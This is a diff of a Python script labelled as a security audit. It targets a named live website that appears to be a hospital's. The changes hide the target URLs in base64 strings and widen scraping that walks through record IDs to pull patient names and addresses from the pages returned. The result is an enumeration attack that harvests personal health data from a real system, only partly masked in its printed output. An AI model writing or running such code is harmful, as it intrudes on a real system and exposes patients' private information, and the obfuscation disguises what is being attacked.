@@ -108,7 +108,7 @@ def fetch_data(id_num):
 
 def audit_security_config():
     print("[*] Starting Security Configuration Audit...")
-    base_url = "https://dolan.rsudsoetijonoblora.com/" 
+    base_url = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tLw==")
     
     # 1. Security Headers Check
     print("\n[+] Audit: Security Headers Analysis")
@@ -135,7 +135,7 @@ def audit_security_config():
 
 def parameter_discovery_audit():
     print("[*] Starting Parameter Discovery Audit (Authenticated)...")
-    target_home = "https://dolan.rsudsoetijonoblora.com/index.php/home"
+    target_home = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21l")
     
     try:
         res = session.get(target_home, timeout=10)
@@ -199,6 +199,8 @@ def parameter_discovery_audit():
                     result_mask = "*" * (len(test_id) - 3) + test_id[-3:]
                     
                     name_tag = test_soup.find('p', class_='sale-price text-success')
+                    # Parsing Data secara lebih luas
+                    name = "Unknown"
                     address = "Tidak Ditemukan"
                     
                     # Ekstraksi Alamat dari detail tag
@@ -207,9 +209,25 @@ def parameter_discovery_audit():
                         if "Alamat" in p.get_text():
                             address = p.get_text().split(":")[-1].strip()
                             break
+                    # Cari Nama (berdasarkan class umum atau label)
+                    name_tag = test_soup.find('p', class_='sale-price')
+                    if name_tag:
+                        name = name_tag.get_text(strip=True).replace("Nama Pasien :", "").strip()
 
                     if name_tag or address != "Tidak Ditemukan":
                         name = name_tag.get_text(strip=True) if name_tag else "Unknown"
+                    # Scan seluruh elemen untuk mencari label Alamat dan Nama jika belum ketemu
+                    for tag in test_soup.find_all(['p', 'td', 'div', 'li']):
+                        txt = tag.get_text(strip=True)
+                        if "Alamat" in txt and ":" in txt:
+                            address = txt.split(":", 1)[-1].strip()
+                        if name == "Unknown" and "Nama" in txt and ":" in txt:
+                            name = txt.split(":", 1)[-1].strip()
+
+                    # Masking No RM untuk tampilan
+                    result_mask = "*" * (len(test_id) - 3) + test_id[-3:]
+
+                    if name != "Unknown" or address != "Tidak Ditemukan":
                         # Masking 3 depan ... 3 belakang
                         m_name = f"{name[:3].upper()}...{name[-3:].upper()}" if len(name) > 6 else name
                         m_addr = f"{address[:3].upper()}...{address[-3:].upper()}" if len(address) > 6 else address
